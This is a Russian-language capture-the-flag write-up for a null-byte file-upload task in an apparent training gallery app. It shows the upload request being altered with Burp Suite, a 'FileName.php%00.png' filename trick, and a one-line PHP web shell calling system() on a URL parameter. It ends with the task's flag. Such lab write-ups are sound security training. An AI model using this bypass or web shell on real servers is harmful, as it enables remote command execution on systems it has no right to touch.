# File upload - Null byte | 25 баллов | Gallery v0.04

1. Переходим на страницу upload  
![markdown logo](https://fv20.failiem.lv/thumb_show.php?i=yrxnvvtky&view)
2. Затем при помощи [Burp Suite](https://kmb.cybber.ru/web/burp/main.html) формируем POST запрос на сайт со страницы upload
- Меняем "Content-Type: image/gif" и дописываем в filename="FileName.php%00.png
* Так же добавляем произвольный PHP код с функцией system:
```php
//php code
<?php 
system($_GET['command']);
?>
```
![markdown logo](https://fv20.failiem.lv/thumb_show.php?i=e8pq4b723&view)

3. Делаем запрос, затем копируем куки в браузер по умолчанию, и открываем загруженный файл. 
![markdown logo](https://fv20.failiem.lv/thumb_show.php?i=bgdu9nsfp&view)
##### h5 flag: YPNchi2NmTwygr2dgCCF 

